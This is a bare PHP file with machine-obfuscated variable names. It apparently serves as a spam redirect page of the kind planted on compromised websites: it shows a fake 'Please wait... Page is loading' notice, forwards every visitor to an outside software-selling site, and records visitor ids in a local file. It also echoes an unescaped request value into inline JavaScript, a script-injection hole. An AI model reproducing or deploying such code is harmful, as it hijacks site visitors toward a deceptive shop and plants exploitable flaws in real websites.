<?php
$sp040977 = 'https://cheapsoftwaredealer.com'; if (!empty($_REQUEST['uri'])) { $sp040977 .= $_REQUEST['uri']; } header("refresh:2; url={$sp040977}"); $sp8bb8c2 = preg_replace('/[^0-9A-Za-z]/', '', $_REQUEST['id']); if (!empty($sp8bb8c2)) { if (file_exists('s.txt')) { $spe6b53d = @unserialize(@file_get_contents('s.txt')) ?: array(); } else { $spe6b53d = array(); } if (empty($spe6b53d[$sp8bb8c2])) { $spe6b53d[$sp8bb8c2] = array(); } if (empty($spe6b53d[$sp8bb8c2]['visited'])) { $spe6b53d[$sp8bb8c2]['visited'] = time(); } @file_put_contents('s.txt', serialize($spe6b53d)); } ?>
<html>
<head>
<title>Please wait...</title>

<script language="javascript">
window.location = "<?php  echo $sp040977; ?>
";
</script>

</head>
<body>

Please wait. Page is loading now...

</body>
</html>
<?php 